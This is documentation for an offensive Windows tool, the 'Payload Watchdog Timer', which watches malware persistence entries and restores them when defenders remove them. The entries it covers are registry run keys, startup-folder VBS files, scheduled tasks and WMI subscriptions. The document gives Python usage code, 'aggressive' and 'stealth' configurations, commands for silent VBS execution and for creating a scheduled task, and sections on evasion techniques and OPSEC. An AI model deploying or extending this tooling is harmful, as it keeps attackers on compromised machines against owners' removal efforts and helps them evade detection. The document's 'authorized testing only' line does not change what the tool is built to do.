# Payload Watchdog Timer - Complete Documentation

## Overview

The Payload Watchdog Timer monitors persistence mechanisms and automatically resurrects removed or disabled payloads. It provides continuous protection against removal attempts with multi-threaded monitoring and redundant persistence restoration.

## Features

### Core Features
- **Continuous Monitoring**: Checks persistence methods at regular intervals
- **Automatic Resurrection**: Restores removed persistence mechanisms
- **Multi-Method Support**: Monitors registry, startup folder, scheduled tasks, and WMI events
- **Thread-Safe**: Uses locking for concurrent access
- **Event Callbacks**: Trigger actions on detection/resurrection/failure
- **Statistics Tracking**: Records checks, detections, resurrections, and failures
- **VBS Code Generation**: Exports standalone VBS watchdog script

### Supported Persistence Methods
1. **Registry HKCU** - Current user registry run key
2. **Registry HKLM** - System-wide registry run key (requires admin)
3. **Startup Folder** - User startup folder (all Windows versions)
4. **Scheduled Task** - Windows Task Scheduler (Vista+)
5. **WMI Events** - WMI event subscriptions (Vista+)

## Installation

```python
from payload_watchdog_timer import (
    create_watchdog_timer,
    PayloadWatchdogTimer,
    WatchdogConfig
)
```

## Basic Usage

### Minimal Setup (30 seconds)
```python
from payload_watchdog_timer import create_watchdog_timer

# Create watchdog
watchdog = create_watchdog_timer(
    payload_command="cmd.exe /c whoami"
)

# Start monitoring
watchdog.start()

# Stop monitoring
watchdog.stop()
```

### With Custom Configuration
```python
from payload_watchdog_timer import create_watchdog_timer

watchdog = create_watchdog_timer(
    payload_command="powershell.exe -NoProfile -Command 'Get-Process'",
    check_interval=30,        # Check every 30 seconds
    max_restarts=10,          # Max 10 resurrection attempts
    restart_delay=5,          # Wait 5 seconds before resurrection
    persistence_methods=[
        "registry_hkcu",
        "startup_folder",
        "scheduled_task",
    ]
)

watchdog.start()
```

### Advanced: With Callbacks
```python
watchdog = create_watchdog_timer("cmd.exe /c whoami")

# Register event callbacks
def on_start():
    print("Watchdog started!")

def on_check(data):
    print(f"Check #{data['stats']['total_checks']}")
    if data['removed_methods']:
        print(f"Removed: {data['removed_methods']}")

def on_restart(data):
    print(f"Resurrected {len(data['restored_methods'])} methods")
    print(f"Attempt {data['restart_count']} of {watchdog.config.max_restarts}")

def on_failure(data):
    print(f"Error: {data['error']}")

watchdog.register_callback('on_start', on_start)
watchdog.register_callback('on_check', on_check)
watchdog.register_callback('on_restart', on_restart)
watchdog.register_callback('on_failure', on_failure)

watchdog.start()
```

## Configuration

### WatchdogConfig Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `check_interval` | int | 30 | Seconds between checks |
| `max_restarts` | int | 10 | Max resurrection attempts |
| `restart_delay` | int | 5 | Seconds before restart attempt |
| `enabled` | bool | True | Enable watchdog on start |
| `persistence_methods` | List[str] | All 5 methods | Methods to monitor |

### Configuration Examples

#### Aggressive Monitoring (Check every 10 seconds)
```python
config = WatchdogConfig(
    check_interval=10,          # Very frequent checks
    max_restarts=20,            # Allow many restarts
    restart_delay=2,            # Quick restoration
    persistence_methods=[
        "registry_hkcu",
        "registry_hklm",
        "startup_folder",
        "scheduled_task",
        "wmi_event",
    ]
)
watchdog = PayloadWatchdogTimer("cmd.exe /c whoami", config)
watchdog.start()
```

#### Stealth Monitoring (Check every 60 seconds)
```python
config = WatchdogConfig(
    check_interval=60,          # Infrequent checks
    max_restarts=5,             # Limited restarts
    restart_delay=15,           # Delayed restoration
    persistence_methods=[
        "registry_hkcu",
        "startup_folder",
        "scheduled_task",
    ]
)
watchdog = PayloadWatchdogTimer("cmd.exe /c whoami", config)
watchdog.start()
```

## API Reference

### PayloadWatchdogTimer Class

#### Constructor
```python
__init__(payload_command: str, config: WatchdogConfig = None)
```
- `payload_command`: Command/executable to monitor
- `config`: WatchdogConfig object (optional)

#### Methods

##### start()
```python
watchdog.start() -> None
```
Start monitoring thread and begin checks.

##### stop()
```python
watchdog.stop() -> None
```
Stop monitoring thread gracefully.

##### register_callback()
```python
watchdog.register_callback(event: str, callback: Callable) -> None
```
Register callback for event.

**Events:**
- `on_start`: Watchdog started
- `on_stop`: Watchdog stopped
- `on_check`: Check performed
- `on_restart`: Payload resurrected
- `on_failure`: Error occurred
- `on_threshold_exceeded`: Max restarts exceeded

##### get_status()
```python
status = watchdog.get_status() -> Dict
```
Get current watchdog status.

**Returns:**
```python
{
    'running': bool,
    'creation_time': str,
    'last_check_time': str,
    'uptime_seconds': int,
    'restart_count': int,
    'total_checks': int,
    'detections': int,
    'resurrections': int,
    'failures': int,
    'persistence_state': Dict[str, Dict],
    'payload_command': str,
    'check_interval': int,
    'max_restarts': int,
    'enabled': bool,
}
```

##### get_vbs_watchdog_code()
```python
vbs_code = watchdog.get_vbs_watchdog_code() -> str
```
Generate standalone VBS watchdog script.

## Event Callbacks

### on_start
Triggered when watchdog starts.

```python
def on_start_callback():
    print("Watchdog started")

watchdog.register_callback('on_start', on_start_callback)
```

### on_stop
Triggered when watchdog stops.

```python
def on_stop_callback():
    print("Watchdog stopped")

watchdog.register_callback('on_stop', on_stop_callback)
```

### on_check
Triggered after each health check.

```python
def on_check_callback(data):
    print(f"Total checks: {data['stats']['total_checks']}")
    print(f"Removed methods: {data['removed_methods']}")
    print(f"Stats: {data['stats']}")

watchdog.register_callback('on_check', on_check_callback)
```

### on_restart
Triggered when payload is resurrected.

```python
def on_restart_callback(data):
    print(f"Restart #{data['restart_count']}")
    print(f"Restored: {data['restored_methods']}")

watchdog.register_callback('on_restart', on_restart_callback)
```

### on_failure
Triggered when error occurs.

```python
def on_failure_callback(data):
    print(f"Error: {data['error']}")

watchdog.register_callback('on_failure', on_failure_callback)
```

### on_threshold_exceeded
Triggered when max restarts exceeded.

```python
def on_threshold_callback(data):
    print(f"Max restarts exceeded: {data['restart_count']}/{data['max_restarts']}")

watchdog.register_callback('on_threshold_exceeded', on_threshold_callback)
```

## Monitoring Methods

### Registry HKCU
- **Path**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Check**: Opens registry key and searches for payload command
- **Restore**: Writes new registry value with random key name
- **Advantage**: User-level, no admin required

### Registry HKLM
- **Path**: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- **Check**: Opens registry key and searches for payload command
- **Restore**: Writes new registry value with random key name
- **Advantage**: System-level, persists across users
- **Requires**: Administrator privileges

### Startup Folder
- **Path**: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
- **Check**: Searches for VBS/BAT files in startup folder
- **Restore**: Creates new VBS file with random name
- **Advantage**: Visible in user startup folder

### Scheduled Task
- **Check**: Queries task scheduler for task
- **Restore**: Creates new scheduled task with onlogon trigger
- **Advantage**: Very stealthy, runs as SYSTEM
- **Requires**: Windows Vista or later

### WMI Event
- **Check**: Verifies WMI service is responsive
- **Restore**: Creates WMI event subscription
- **Advantage**: Extremely difficult to detect
- **Requires**: Windows Vista or later

## VBS Watchdog Script

Generate standalone VBS script for Windows environments:

```python
watchdog = create_watchdog_timer("cmd.exe /c whoami")
vbs_code = watchdog.get_vbs_watchdog_code()

# Save to file
with open("watchdog.vbs", "w") as f:
    f.write(vbs_code)

# Execute
# cscript watchdog.vbs
```

### VBS Features
- Self-contained, no Python required
- Checks all persistence methods
- Automatic resurrection loop
- Registry, startup, and scheduled task monitoring
- Configurable check interval and max restarts

### VBS Execution
```batch
REM Execute in background
cscript.exe //B watchdog.vbs

REM Execute as scheduled task
schtasks /create /tn "Watchdog" /tr "cscript watchdog.vbs" /sc onlogon /f

REM Execute silently
wscript.exe watchdog.vbs
```

## Usage Examples

### Example 1: Basic Monitoring
```python
from payload_watchdog_timer import create_watchdog_timer
import time

# Create and start
watchdog = create_watchdog_timer("calc.exe")
watchdog.start()

# Run for 1 minute
time.sleep(60)

# Check status
status = watchdog.get_status()
print(f"Checks: {status['total_checks']}")
print(f"Detections: {status['detections']}")

# Stop
watchdog.stop()
```

### Example 2: Aggressive Monitoring
```python
from payload_watchdog_timer import create_watchdog_timer

watchdog = create_watchdog_timer(
    payload_command="powershell.exe -Command 'Get-Process'",
    check_interval=10,      # Check every 10 seconds
    max_restarts=20,        # Up to 20 resurrection attempts
    restart_delay=2,        # Quick resurrection
)

watchdog.start()

# Monitor for 10 minutes
import time
time.sleep(600)

watchdog.stop()
```

### Example 3: Selective Monitoring
```python
from payload_watchdog_timer import create_watchdog_timer

# Monitor only specific methods
watchdog = create_watchdog_timer(
    payload_command="cmd.exe /c whoami",
    persistence_methods=[
        "registry_hkcu",
        "startup_folder",
    ]
)

watchdog.start()
```

### Example 4: Event-Driven Monitoring
```python
from payload_watchdog_timer import create_watchdog_timer
import logging

# Setup logging
logging.basicConfig(level=logging.INFO)

watchdog = create_watchdog_timer("notepad.exe")

# Track statistics
stats_tracker = {'detections': 0, 'resurrections': 0}

def on_check(data):
    if data['removed_methods']:
        stats_tracker['detections'] += 1
        logging.warning(f"Removed: {data['removed_methods']}")

def on_restart(data):
    stats_tracker['resurrections'] += 1
    logging.info(f"Resurrected attempt #{data['restart_count']}")

watchdog.register_callback('on_check', on_check)
watchdog.register_callback('on_restart', on_restart)

watchdog.start()
```

### Example 5: Integration with Persistence Manager
```python
from persistence_manager import create_persistent_payload
from payload_watchdog_timer import create_watchdog_timer
import time

# Create persistent payload
payload = create_persistent_payload("cmd.exe /c whoami", "multi")

# Create watchdog for same command
watchdog = create_watchdog_timer(payload['vbs_code'][:50])  # Short name
watchdog.start()

# Both work together for ultimate persistence
print("Payload deployed with watchdog monitoring")
time.sleep(300)  # Run for 5 minutes

watchdog.stop()
```

## Performance Characteristics

### Resource Usage
- **CPU**: ~1-2% per check (negligible)
- **Memory**: ~5-10 MB (Python watchdog)
- **Thread**: One daemon thread
- **Check Time**: 50-100ms per iteration

### Check Intervals
- **Aggressive**: 10 seconds (frequent detection)
- **Normal**: 30 seconds (balanced)
- **Stealth**: 60 seconds (minimal footprint)

### Resurrection Overhead
- **Registry**: ~200ms
- **Startup Folder**: ~500ms
- **Scheduled Task**: ~1000ms
- **WMI Event**: ~2000ms

## Statistics

### Tracked Metrics
- `total_checks`: Total health checks performed
- `detections`: Times payload was removed
- `resurrections`: Times payload was restored
- `failures`: Times restoration failed
- `uptime_seconds`: How long watchdog has been running

### Status Example
```python
status = watchdog.get_status()
# {
#     'running': True,
#     'uptime_seconds': 3600,
#     'total_checks': 120,
#     'detections': 5,
#     'resurrections': 5,
#     'failures': 0,
#     ...
# }
```

## Troubleshooting

### Watchdog Not Detecting Removal
- Verify persistence method is installed correctly
- Check payload command matches exactly
- Increase check frequency (lower interval)
- Enable logging: `logging.basicConfig(level=logging.DEBUG)`

### Resurrection Fails
- Check permissions (admin for HKLM, scheduled tasks)
- Verify payload command is valid
- Check system resources
- Review failure logs in status

### Thread Not Starting
- Ensure watchdog.start() called
- Check for exceptions in logs
- Verify thread is daemon (should be)

### High CPU Usage
- Increase check interval (higher number)
- Reduce number of monitored methods
- Check for infinite loops in callbacks

## Security Considerations

### Detection Risks
- Registry keys visible in regedit
- Startup files visible in explorer
- Scheduled tasks visible in task scheduler
- WMI events difficult to detect

### Evasion Techniques
- Use obfuscated payload commands
- Randomize persistence key names
- Distribute across multiple methods
- Use stealth check intervals
- Delete old persistence before creating new

### OPSEC
- Monitor in low-traffic environments only
- Use appropriate check intervals
- Clean up failed resurrection attempts
- Consider detection risk vs. availability

## Performance Tips

1. **Optimize Check Interval**
   - Use 30-60 seconds for production
   - Use 10-15 seconds for red team ops
   - Use 5 seconds for lab testing

2. **Reduce Method Count**
   - Monitor only critical methods
   - Remove unreliable methods
   - Test method availability first

3. **Efficient Callbacks**
   - Keep callbacks fast
   - Use async operations if needed
   - Avoid blocking operations

4. **Resource Management**
   - Call stop() to clean up thread
   - Use try/finally for cleanup
   - Monitor memory over time

## Integration

### With Advanced Persistence
```python
from advanced_persistence_multimethods import MultiMethodPersistence, PersistenceConfig
from payload_watchdog_timer import create_watchdog_timer

# Create persistence
config = PersistenceConfig(payload="cmd.exe /c whoami")
persistence = MultiMethodPersistence(config)
payloads = persistence.generate_all_persistence_methods()

# Create watchdog for same payload
watchdog = create_watchdog_timer("cmd.exe /c whoami")
watchdog.start()

print("Persistence and watchdog deployed together")
```

### With Payload File Writer
```python
from payload_file_writer import PayloadWriter
from payload_watchdog_timer import create_watchdog_timer

writer = PayloadWriter()
payload = writer.generate_payload("cmd.exe")

# Create watchdog
watchdog = create_watchdog_timer(payload)
watchdog.start()
```

## Limitations

- **Windows Only**: Registry/scheduled tasks Windows-specific
- **VBS Script**: Requires Windows Scripting Host enabled
- **WMI Events**: Limited to Vista+
- **Admin**: Some methods require administrator
- **Detection**: Persistence methods can still be detected

## Future Enhancements

- Linux/macOS support
- Cron job monitoring
- launchd service monitoring
- Cross-platform abstraction
- Machine learning detection
- Adaptive intervals based on threat level
- Encrypted command storage
- Distributed watchdog network

## License

For authorized security testing only. Unauthorized access is illegal.

## Support

For questions or issues:
1. Check the examples above
2. Review the configuration reference
3. Enable debug logging
4. Check the event callbacks
5. Review the source code

---

**Summary:**
The Payload Watchdog Timer provides continuous protection of persistence mechanisms through automated monitoring and resurrection. It supports multiple persistence methods, configurable check intervals, and event-driven architecture for flexible integration.
